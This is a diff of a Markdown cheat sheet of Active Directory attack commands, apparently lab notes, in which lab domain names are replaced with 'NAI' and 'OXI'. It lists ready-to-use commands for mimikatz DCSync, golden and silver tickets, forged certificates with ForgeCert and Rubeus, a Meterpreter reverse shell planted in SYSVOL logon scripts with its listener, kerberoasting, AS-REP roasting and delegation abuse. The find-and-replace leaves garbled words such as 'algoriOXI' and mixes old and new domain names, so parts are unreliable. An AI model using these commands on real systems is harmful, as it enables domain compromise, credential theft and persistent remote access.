@@ -417,7 +417,7 @@ Unregister-ScheduledTask -CimSession $Session -TaskName "OXItask2"`
 Supply data to BloodHound:
 `. C:\AD\Tools\BloodHound-master\Collectors\SharpHound.ps1`
 `Invoke-BloodHound -CollectionMethod All`
-`.\SharpHound.exe --CollectionMethods All --Domain za.tryhackme.com --ExcludeDCs` Collect all but do not touch domain controllers- Theoretically evasive
+`.\SharpHound.exe --CollectionMethods All --Domain za.NAI.com --ExcludeDCs` Collect all but do not touch domain controllers- Theoretically evasive
 `neo4j console` Start neo4j
 `bloodhound`
 
@@ -542,7 +542,7 @@ dir \OXIrootdc.NAI.loc\c$\
 ## Persistence in AD
 - **DC SYNC all** 
 `mimikatz # log syncemup_dcdump.txt `
-`mimikatz # lsadump::dcsync /domain:za.tryhackme.loc /all`*Get all username, hashes and etc*
+`mimikatz # lsadump::dcsync /domain:za.NAI.loc /all`*Get all username, hashes and etc*
 - **DC SYNC Alrternative of mimi(remote ofc)**
 `python3.9 /opt/impacket/examples/secretsdump.py -just-dc THM.red/<AD_Admin_User>@MACHINE_IP`
 0x36c8d26ec0df8b23ce63bcefa6e2d821
@@ -552,11 +552,11 @@ dir \OXIrootdc.NAI.loc\c$\
 *All the other information can be found on a dc sync*
 
 - **Golden ticket**
-`mimikatz # kerberos::golden /admin:ALegitAccount /domain:za.tryhackme.loc /id:500 /sid:<Domain SID> /krbtgt:<NTLM hash of KRBTGT account> /endin:600 /renewmax:10080 /ptt`
+`mimikatz # kerberos::golden /admin:ALegitAccount /domain:za.NAI.loc /id:500 /sid:<Domain SID> /krbtgt:<NTLM hash of KRBTGT account> /endin:600 /renewmax:10080 /ptt`
 
 - **Silver ticket**
 ```         
-mimikatz # kerberos::golden /admin:ALegitAccount /domain:za.tryhackme.loc /id:500 /sid:<Domain SID> /target:<Hostname of server being targeted> /rc4:<NTLM Hash of machine account of target> /service:cifs /ptt
+mimikatz # kerberos::golden /admin:ALegitAccount /domain:za.NAI.loc /id:500 /sid:<Domain SID> /target:<Hostname of server being targeted> /rc4:<NTLM Hash of machine account of target> /service:cifs /ptt
 ```
 
 - **Generating our own Certificates become CA and make them cry**
@@ -566,7 +566,7 @@ mimikatz # kerberos::golden /admin:ALegitAccount /domain:za.tryhackme.loc /id:50
 `mimikatz # crypto::cng`
 `mimikatz # crypto::certificates /systemstore:local_machine /export`The exported certificates will be stored in both PFX and DER format to disk, The za-THMDC-CA.pfx certificate is the one we are particularly interested in. In order to export the private key, a password must be used to encrypt the certificate. By default, Mimikatz assigns the password of mimikatz.
 
-`C:\Users\aaron.jones>C:\Tools\ForgeCert\ForgeCert.exe --CaCertPath za-THMDC-CA.pfx --CaCertPassword mimikatz --Subject CN=User --SubjectAltName Administrator@za.tryhackme.loc --NewCertPath fullAdmin.pfx --NewCertPassword Password123 `
+`C:\Users\aaron.jones>C:\Tools\ForgeCert\ForgeCert.exe --CaCertPath za-THMDC-CA.pfx --CaCertPassword mimikatz --Subject CN=User --SubjectAltName Administrator@za.NAI.loc --NewCertPath fullAdmin.pfx --NewCertPassword Password123 `
 
     CaCertPath - The path to our exported CA certificate.
     CaCertPassword - The password used to encrypt the certificate. By default, Mimikatz assigns the password of mimikatz.
@@ -575,10 +575,10 @@ mimikatz # kerberos::golden /admin:ALegitAccount /domain:za.tryhackme.loc /id:50
     NewCertPath - The path to where ForgeCert will store the generated certificate.
     NewCertPassword - Since the certificate will require the private key exported for authentication purposes, we must set a new password used to encrypt it.
 
-`C:\Users\aaron.jones>C:\Tools\Rubeus.exe asktgt /user:Administrator /enctype:aes256 /certificate:vulncert.pfx /password:tryhackme /outfile:administrator.kirbi /domain:za.tryhackme.loc /dc:10.200.x.101`*Get the TGT*
+`C:\Users\aaron.jones>C:\Tools\Rubeus.exe asktgt /user:Administrator /enctype:aes256 /certificate:vulncert.pfx /password:NAI /outfile:administrator.kirbi /domain:za.NAI.loc /dc:10.200.x.101`*Get the TGT*
 
     /user - This specifies the user that we will impersonate and has to match the UPN for the certificate we generated
-    /enctype -This specifies the encryption type for the ticket. Setting this is important for evasion, since the default encryption algorithm is weak, which would result in an overpass-the-hash alert
+    /enctype -This specifies the encryption type for the ticket. Setting this is important for evasion, since the default encryption algoriOXI is weak, which would result in an overpass-the-hash alert
     /certificate - Path to the certificate we have generated
     /password - The password for our certificate file
     /outfile - The file where our TGT will be output to
@@ -649,7 +649,7 @@ Inject into the templates that generate the default groups. By injecting into th
 
 To avoid kicking users out of their RDP sessions, it will be best to RDP into THMWRK1 using your low privileged credentials, use the runas command to inject the Administrator credentials, and then execute MMC from this new terminal:
 
-`runas /netonly /user:thmchilddc.tryhackme.loc\Administrator cmd.exe`
+`runas /netonly /user:OXIchilddc.NAI.loc\Administrator cmd.exe`
 
 *Once you have an MMC window, add the Users and Groups Snap-in (File->Add Snap-In->Active Directory Users and Computers). Make sure to enable Advanced Features (View->Advanced Features). We can find the AdminSDHolder group under Domain->System:*
 
@@ -668,11 +668,11 @@ To avoid kicking users out of their RDP sessions, it will be best to RDP into TH
 `msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=persistad lport=4445 -f exe > <username>_shell.exe`
 
 *Create the following script .bat*
-`copy \\za.tryhackme.loc\sysvol\za.tryhackme.loc\scripts\<username>_shell.exe C:\tmp\<username>_shell.exe && timeout /t 20 && C:\tmp\<username>_shell.exe`
+`copy \\za.NAI.loc\sysvol\za.NAI.loc\scripts\<username>_shell.exe C:\tmp\<username>_shell.exe && timeout /t 20 && C:\tmp\<username>_shell.exe`
 
 
-`scp am0_shell.exe za\\Administrator@thmdc.za.tryhackme.loc:C:/Windows/SYSVOL/sysvol/za.tryhackme.loc/scripts/`
-`scp am0_script.bat za\\Administrator@thmdc.za.tryhackme.loc:C:/Windows/SYSVOL/sysvol/za.tryhackme.loc/scripts/` *SCP and our Administrator credentials to copy both scripts to the SYSVOL directory:*
+`scp am0_shell.exe za\\Administrator@OXIdc.za.NAI.loc:C:/Windows/SYSVOL/sysvol/za.NAI.loc/scripts/`
+`scp am0_script.bat za\\Administrator@OXIdc.za.NAI.loc:C:/Windows/SYSVOL/sysvol/za.NAI.loc/scripts/` *SCP and our Administrator credentials to copy both scripts to the SYSVOL directory:*
 
 `msfconsole -q -x "use exploit/multi/handler; set payload windows/x64/meterpreter/reverse_tcp; set LHOST persistad; set LPORT 4445;exploit"`*listener*
 
@@ -756,8 +756,8 @@ Right after you perform these steps, you will get an error that you can no longe
 `Get-WebCredentials`
 
 - **Windows cred dump**
-`C:\Users\thm>cmdkey /list`*Enumerating for Stored Windows Credentials*
-`runas /savecred /user:THM.red\thm-local cmd.exe`*Run CMD.exe As a User with the /savecred argument*
+`C:\Users\OXI>cmdkey /list`*Enumerating for Stored Windows Credentials*
+`runas /savecred /user:THM.red\OXI-local cmd.exe`*Run CMD.exe As a User with the /savecred argument*
 THM{Runa5S4veCr3ds}
 
 - **NTDS dump from the domain controller(local adm rights)**
@@ -825,11 +825,11 @@ Find user accounts used as Service accounts there is no need that this service i
 `Rubeus.exe kerberoast /outfile:targetedhashes.txt`
 
 # Kerberoasting with impacket
-`python3.9 /opt/impacket/examples/GetUserSPNs.py -dc-ip MACHINE_IP THM.red/thm` *Enumerating for SPN Accounts*
-`python3.9 /opt/impacket/examples/GetUserSPNs.py -dc-ip MACHINE_IP THM.red/thm -request-user svc-user` *Requesting a TGS Ticket as SPN Account*
+`python3.9 /opt/impacket/examples/GetUserSPNs.py -dc-ip MACHINE_IP THM.red/OXI` *Enumerating for SPN Accounts*
+`python3.9 /opt/impacket/examples/GetUserSPNs.py -dc-ip MACHINE_IP THM.red/OXI -request-user svc-user` *Requesting a TGS Ticket as SPN Account*
 
 # AS-REP Roasting
-`python3.9 /opt/impacket/examples/GetNPUsers.py -dc-ip MACHINE_IP thm.red/ -usersfile /tmp/users.txt` *Performing an AS-REP Roasting Attack against Users List*
+`python3.9 /opt/impacket/examples/GetNPUsers.py -dc-ip MACHINE_IP OXI.red/ -usersfile /tmp/users.txt` *Performing an AS-REP Roasting Attack against Users List*
 
 ##  When running Commands for finding local admin rights on other machines is also noisy.
 # Find all machines on the current domain where the current user has local admin access (also Find-WMILocalAdminAccess.ps1 and Find-PSRemotingLocalAdminAccess.ps1)
@@ -939,25 +939,25 @@ Get-ADGroupMember -Identity $group
 `mimikatz # token::revert` *revert the priv*
 
 - **kekeo: Generate TGT for services**
-`tgt::ask /user:svcIIS /domain:za.tryhackme.loc /password:redacted`
+`tgt::ask /user:svcIIS /domain:za.NAI.loc /password:redacted`
 *user - The user who has the constrained delegation permissions.
 domain - The domain that we are attacking since Kekeo can be used to forge tickets to abuse cross-forest trust.
 password - The password associated with the svcIIS account.*
 
 - **kekeo: Generate TGS (for both services)**
-`tgs::s4u /tgt:TGT_svcIIS@ZA.TRYHACKME.LOC_krbtgt~za.tryhackme.loc@ZA.TRYHACKME.LOC.kirbi /user:t1_trevor.jones /service:http`
-`tgs::s4u /tgt:TGT_svcIIS@ZA.TRYHACKME.LOC_krbtgt~za.tryhackme.loc@ZA.TRYHACKME.LOC.kirbi /user:t1_trevor.jones /service:wsman/THMSERVER1.za.tryhackme.loc`
+`tgs::s4u /tgt:TGT_svcIIS@ZA.TRYHACKME.LOC_krbtgt~za.NAI.loc@ZA.TRYHACKME.LOC.kirbi /user:t1_trevor.jones /service:http`
+`tgs::s4u /tgt:TGT_svcIIS@ZA.TRYHACKME.LOC_krbtgt~za.NAI.loc@ZA.TRYHACKME.LOC.kirbi /user:t1_trevor.jones /service:wsman/THMSERVER1.za.NAI.loc`
 
 - **mimikatz import the two TGS**
 `mimikatz # privilege::debug`
-`kerberos::ptt TGS_t1_trevor.jones@ZA.TRYHACKME.LOC_wsman~THMSERVER1.za.tryhackme.loc@ZA.TRYHACKME.LOC.kirbi`
-`kerberos::ptt TGS_t1_trevor.jones@ZA.TRYHACKME.LOC_http~THMSERVER1.za.tryhackme.loc@ZA.TRYHACKME.LOC.kirbi`
+`kerberos::ptt TGS_t1_trevor.jones@ZA.TRYHACKME.LOC_wsman~THMSERVER1.za.NAI.loc@ZA.TRYHACKME.LOC.kirbi`
+`kerberos::ptt TGS_t1_trevor.jones@ZA.TRYHACKME.LOC_http~THMSERVER1.za.NAI.loc@ZA.TRYHACKME.LOC.kirbi`
 
 - **Check if the PSsession exists**
-`New-PSSession -ComputerName thmserver1.za.tryhackme.loc`
+`New-PSSession -ComputerName OXIserver1.za.NAI.loc`
 
 - **Get RCE on the server**
-`Enter-PSSession -ComputerName thmserver1.za.tryhackme.loc`
+`Enter-PSSession -ComputerName OXIserver1.za.NAI.loc`
 
 - **The idea is to Discover domain computers which have unconstrained delegation enabled using PowerView:**
 `Get-DomainComputer -UnConstrained`
